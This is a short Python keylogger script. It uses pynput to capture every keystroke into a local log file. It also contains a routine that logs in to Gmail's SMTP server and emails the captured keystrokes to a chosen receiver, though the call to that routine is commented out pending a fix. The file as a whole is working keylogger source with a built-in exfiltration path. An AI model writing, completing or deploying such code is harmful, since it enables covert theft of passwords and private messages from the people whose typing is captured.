from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# Email configuration
EMAIL_ADDRESS = 'your_email'
EMAIL_PASSWORD = 'your_password'
EMAIL_RECEIVER = 'receiver email'
# file to store pressed keys
LOG_FILE = 'keylog.txt'
# Current date; format: DD-MM-YYYY
current_date = datetime.now().strftime('%d-%m-%Y')


def send_email():
    try:
        with open(LOG_FILE, 'r') as file:
            log_content = file.read()

        # creating an email msg
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = f'Keyloger logs - {current_date}'
        msg.attach(MIMEText(log_content, 'plain'))

        # sending an email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_RECEIVER, msg.as_string())
        print('Logs were sent to email')
    except Exception as e:
        print(f'Error occured while sending an email: {e}')


def write_to_file(key) :
    # Saving pressed keys to file
    with open(LOG_FILE, 'a') as file:
        try:
            file.write(f'{key.char}')
        except:
            # Special keys like 'enter' 'space'
            file.write(f' [{key}] ')

def on_press(key) :
    # Function called by pressed key
    write_to_file(key)

def on_release(key) :
    # Stopping logger when 'esc' was pressed
    if key == keyboard.Key.esc:
        print('ESC pressed. Stopping listener and sending an email.')
        # Turned off due to error. Solving in progress.
        #send_email()
        return False
    
if __name__ == '__main__' :
    print('Keylogger running... press Esc to stop.')
    # Making keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()